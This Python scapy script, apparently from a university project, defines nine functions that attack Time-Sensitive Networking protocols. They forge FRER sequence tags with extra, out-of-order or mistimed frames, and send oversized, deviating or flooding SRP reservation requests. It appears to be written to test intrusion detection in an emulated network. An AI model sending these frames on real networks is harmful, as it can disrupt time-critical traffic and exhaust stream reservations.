# -----------------------------------------------------------
#
#  scapy-attacks.py
#
# This file starts a scapy instance and provides functions to run attacks using FRER and SRP
#
# (C) 2022 Robin Schenderlein, Hamburg, Germany
# Released under GNU Public License (GPL)
# email robin.schenderlein@studium.uni-hamburg.de
# -----------------------------------------------------------
import random
import time

import numpy as np
from scapy.layers.l2 import Dot1Q
from scapy.sendrecv import sendp

from CB import CB
from SRP import *

from scapy.all import wrpcap

logger = logging.getLogger("scapy")
logger.setLevel(logging.INFO)

nr_of_member_streams = 5
sequence_nr = 0  # Does not matter where it starts, first msg is always TAKE_ANY
timeout = 20


def create_srp_frame(interval_numerator=1, interval_denominator=1,
                     max_frames_per_interval=2, max_frame_size=32, priority_code_point=8, unique_id=0):
    if 0 <= priority_code_point < 8:
        return SRP(
            tlvlist=[
                Talker(
                    tlvlist=[
                        StreamID(MacAddress="00:00:00:00:00:02", UniqueID=unique_id),
                        StreamRank(),
                        DataFrameSpecification(
                            tlvlist=[
                                IEEE802VlanTag(PriorityCodePoint=priority_code_point)
                            ]
                        ),
                        TrafficSpecification(IntervalNumerator=interval_numerator,
                                             IntervalDenominator=interval_denominator,
                                             MaxFramesPerInterval=max_frames_per_interval,
                                             MaxFrameSize=max_frame_size),
                        UserToNetworkRequirements()
                    ]
                ),
                Status(
                    tlvlist=[
                        StatusInfo(),
                        AccumulatedLatency()
                    ]
                ),
            ]
        )
    else:
        return SRP(
            tlvlist=[
                Talker(
                    tlvlist=[
                        StreamID(MacAddress="00:00:00:00:00:02", UniqueID=unique_id),
                        StreamRank(),
                        TrafficSpecification(IntervalNumerator=interval_numerator,
                                             IntervalDenominator=interval_denominator,
                                             MaxFramesPerInterval=max_frames_per_interval,
                                             MaxFrameSize=max_frame_size),
                        UserToNetworkRequirements()
                    ]
                ),
                Status(
                    tlvlist=[
                        StatusInfo(),
                        AccumulatedLatency()
                    ]
                ),
            ]
        )


def send_cb(interface_name, sequence_number, nr_of_packets=1, interval=0):
    packet = (Ether(src="00:00:00:00:00:02", dst=" 00:00:00:00:00:04")
              / Dot1Q(vlan=1000) / CB(sequence_nr=sequence_number))
    sendp(packet, interface_name, count=nr_of_packets, inter=interval)
    # time between each packet is roughly 300 µs = 0.0003 seconds

def send_srp1(interface_name):
    srp_frame = SRP(
        tlvlist=[
            Talker(
                tlvlist=[
                    StreamID(MacAddress="00:00:00:00:00:02", UniqueID=1),
                    StreamRank(),
                    TrafficSpecification(),
                    UserToNetworkRequirements(NumSeamlessTrees=nr_of_member_streams)
                ]
            ),
            Status(
                tlvlist=[
                    StatusInfo(),
                    AccumulatedLatency()
                ]
            ),
        ]
    )
    packet = (Ether(src="00:00:00:00:00:02", dst="00:00:00:00:00:04") / Dot1Q(vlan=1000) / srp_frame)
    sendp(packet, interface_name)


def send_srp(srp_frame, interface_name="h2-eth0"):
    if isinstance(srp_frame, list):
        packet = []
        for frame in srp_frame:
            packet.append(Ether(src="00:00:00:00:00:02", dst="00:00:00:00:00:04") / Dot1Q(vlan=1000) / frame)
    else:
        packet = (Ether(src="00:00:00:00:00:02", dst="00:00:00:00:00:04") / Dot1Q(vlan=1000) / srp_frame)
    sendp(packet, interface_name)


def list_attacks():
    print(attack1.__doc__)
    print(attack2.__doc__)
    print(attack3.__doc__)
    print(attack4.__doc__)
    print(attack5.__doc__)
    print(attack6.__doc__)
    print(attack7.__doc__)
    print(attack8.__doc__)
    print(attack9.__doc__)


# FRER attacks:

def attack1(interface_name="h2-eth0"):
    """attack1 - Send more frames for compound stream than member streams.
    :param interface_name: Optional interface name, that should be used to send a frame"""
    nr_of_msgs = 3
    global sequence_nr
    for _ in range(nr_of_msgs):
        send_cb(interface_name, sequence_nr, nr_of_member_streams)
        sequence_nr += 1
        time.sleep(1)
    send_cb(interface_name, sequence_nr)  # packet added by attacker, originator does not matter for now
    for _ in range(nr_of_msgs):
        send_cb(interface_name, sequence_nr, nr_of_member_streams)
        sequence_nr += 1
        time.sleep(1)


def send_cb_timed(jitter, first_delay, delays, start_time, interface_name):
    print(time.time())
    global sequence_nr
    has_jitter = bool(random.getrandbits(1))
    if has_jitter:
        time.sleep(jitter)
    time.sleep(first_delay)
    send_cb(interface_name, sequence_nr)
    for delay in delays:
        time.sleep(delay)
        send_cb(interface_name, sequence_nr)
    sequence_nr += 1
    time.sleep(1 - ((time.time() - start_time) % 1))  # schedule close as possible to 1 sec


def attack2(transmission_latencies=None, jitter=None, changing_packet=0, delta=0, interface_name="h2-eth0"):
    """attack2 - Sends a flow of FRER packets, but one packet has a change in inter-arrival time.
        :param transmission_latencies:List of latencies for each packet
        :param jitter: Jitter for the talker
        :param changing_packet: the paket in transmission_latencies that should get changed
        :param delta: Time delta by which the packet should arrive later
        :param interface_name: Optional interface name, that should be used to send a frame"""
    nr_of_emissions = 20
    if transmission_latencies is None:
        transmission_latencies = [0, 0, 0.1, 0.1, 0.2]
    transmission_latencies.sort()
    delays = np.diff(transmission_latencies)
    if jitter is None:
        jitter = 0.1 * 1
    time.sleep(1 - time.time() % 1)  # try to get same start over restart
    start_time = time.time().__floor__()
    for _ in range(nr_of_emissions):
        send_cb_timed(jitter, transmission_latencies[0], delays, start_time, interface_name)
    transmission_latencies[changing_packet] += delta
    transmission_latencies.sort()
    delays = np.diff(transmission_latencies)
    for _ in range(nr_of_emissions):
        send_cb_timed(jitter, transmission_latencies[0], delays, start_time, interface_name)


def attack3(delta=50, interface_name="h2-eth0"):
    """attack3 - Sends a continuous flow of FRER packets, but one packet is out of order.
    :param interface_name: Optional interface name, that should be used to send a frame.
    :param delta: Optional offset for the out-of-order packet."""
    global sequence_nr
    nr_of_msgs = 3
    print(f'Sends {nr_of_member_streams} member streams and after incrementing the sequence number {nr_of_msgs} times '
          f' one messages has a different sequence number. The flow continues for {nr_of_msgs} iterations.')
    for _ in range(nr_of_msgs):
        send_cb(interface_name, sequence_nr, nr_of_member_streams)
        sequence_nr += 1
        time.sleep(1)
    send_cb(interface_name, sequence_nr, nr_of_member_streams - 1)
    send_cb(interface_name, sequence_nr + delta)
    sequence_nr += 1
    for _ in range(nr_of_msgs):
        send_cb(interface_name, sequence_nr, nr_of_member_streams)
        sequence_nr += 1
        time.sleep(1)


def attack4(interface_name="h2-eth0"):
    """attack4 - Sends multiple member stream, belonging to the same compound stream.
    Every 5 seconds a stream will be dropped.
    :param interface_name: Optional interface name, that should be used to send a frame"""
    global sequence_nr
    print(f"Sends {nr_of_member_streams} member streams and every 5 seconds a stream is dropped ")
    start_time = time.time()
    for i in range(nr_of_member_streams, 0, -1):
        for _ in range(5):
            send_cb(interface_name, sequence_nr, i)
            sequence_nr += 1
            time.sleep(1 - ((time.time() - start_time) % 1.0))  # schedule close as possible to 1 sec
    # there is actually a FRER event exactly for that, SIGNAL_LATENT_ERROR, it is not defined what
    # happens with this event or after what time / difference it gets triggered.
    # It should be possible for a FRER component to send a msg to a Zeek component.
    # So there is no actual need to implement that in Zeek


# SRP attacks

def attack5(interval_numerator=360, interval_denominator=1, max_frames_per_interval=65535, max_frame_size=65535):
    # Used for violating SRP resource allocation restricted by a threshold.
    """attack5 - Sends a single SRP request.
        :param interval_numerator: Together with interval_denominator builds an interval in seconds
        :param interval_denominator: Together with interval_numerator builds an interval in seconds
        :param max_frames_per_interval: Max. frames per interval
        :param max_frame_size: Max. size per frame
        """
    send_srp(create_srp_frame(interval_numerator=interval_numerator,
                              interval_denominator=interval_denominator,
                              max_frames_per_interval=max_frames_per_interval,
                              max_frame_size=max_frame_size))


# Attack 6 - Logging SRP resource allocation deviating from previous allocations so much
# SRP handles mostly requests and answers. Done
def attack6(interval_numerator=10, interval_denominator=1, max_frames_per_interval=1, max_frame_size=200,
            interval_numerator_atk=10, interval_denominator_atk=1, max_frames_per_interval_atk=1,
            max_frame_size_atk=300, ):
    """attack6 - Sends 10  SRP request. The first five with max_frame_size * 2. The last five with max_frame_size / 2.
        Followed by another SRP request with different values.
            :param interval_numerator: Together with interval_denominator builds an interval in seconds. Used to set a
            baseline.
            :param interval_denominator: Together with interval_numerator builds an interval in seconds. Used to set a
            baseline.
            :param max_frames_per_interval: Max. frames per interval. Used to set a baseline.
            :param max_frame_size: Max. size per frame. Used to set a baseline.
            :param interval_numerator_atk: Together with interval_denominator builds an interval in seconds. Used for a
            single frame deviation.
            :param interval_denominator_atk: Together with interval_numerator builds an interval in seconds. Used for a
            single frame deviation.
            :param max_frames_per_interval_atk: Max. frames per interval. Used for a single frame deviation.
            :param max_frame_size_atk: Max. size per frame. Used for a single frame deviation.
            """
    for i in range(5):
        send_srp(create_srp_frame(interval_numerator=interval_numerator,
                                  interval_denominator=interval_denominator,
                                  max_frames_per_interval=max_frames_per_interval,
                                  max_frame_size=max_frame_size * 2,
                                  unique_id=200 + i))
    for i in range(5):
        send_srp(create_srp_frame(interval_numerator=interval_numerator,
                                  interval_denominator=interval_denominator,
                                  max_frames_per_interval=max_frames_per_interval,
                                  max_frame_size=int(max_frame_size / 2),
                                  unique_id=205 + i))
    send_srp(create_srp_frame(interval_numerator=interval_numerator_atk,
                              interval_denominator=interval_denominator_atk,
                              max_frames_per_interval=max_frames_per_interval_atk,
                              max_frame_size=max_frame_size_atk,
                              unique_id=300))


def attack7(nr_of_requests=10, time_window=10):
    """ Sends many SRP requests for different streams.
    :param nr_of_requests: The amount of requests that should get sent.
    :param time_window: The time frame in which the requests get sent."""
    for i in range(100, 100 + nr_of_requests):
        send_srp(create_srp_frame(unique_id=200 + i))
        time.sleep(time_window / nr_of_requests)


def attack8(interval_numerator=1, interval_denominator=1, max_frames_per_interval=1, max_frame_size=800,
            interval_numerator_changed=1, interval_denominator_changed=1, max_frames_per_interval_changed=1,
            max_frame_size_changed=800):
    """attack5 - Sends two SRP requests. The second requests tries to introduce changes after the first SRP got
    accepted.
    requests. One requests higher values. The other lower values.
            :param interval_numerator: Together with interval_denominator builds an interval in seconds
            :param interval_denominator: Together with interval_numerator builds an interval in seconds
            :param max_frames_per_interval: Max. frames per interval
            :param max_frame_size: Max. size per frame
            :param interval_numerator_changed: Together with interval_denominator builds an interval in seconds
            :param interval_denominator_changed: Together with interval_numerator builds an interval in seconds
            :param max_frames_per_interval_changed: Max. frames per interval
            :param max_frame_size_changed: Max. size per frame
            """
    unique_id = 888
    send_srp(create_srp_frame(interval_numerator=interval_numerator,
                              interval_denominator=interval_denominator,
                              max_frames_per_interval=max_frames_per_interval,
                              max_frame_size=max_frame_size,
                              unique_id=unique_id))

    send_srp(create_srp_frame(interval_numerator=interval_numerator_changed,
                              interval_denominator=interval_denominator_changed,
                              max_frames_per_interval=max_frames_per_interval_changed,
                              max_frame_size=max_frame_size_changed,
                              unique_id=unique_id))


def attack9():
    """ Sends a single SRP reservation and waits until timeout occurs """
    # No need to fill out complete message, as it just creates an entry for streamID config
    send_srp(create_srp_frame())
    time.sleep(timeout)


if __name__ == "__main__":
    interact(mydict=globals(), mybanner="Test add-on TSN")
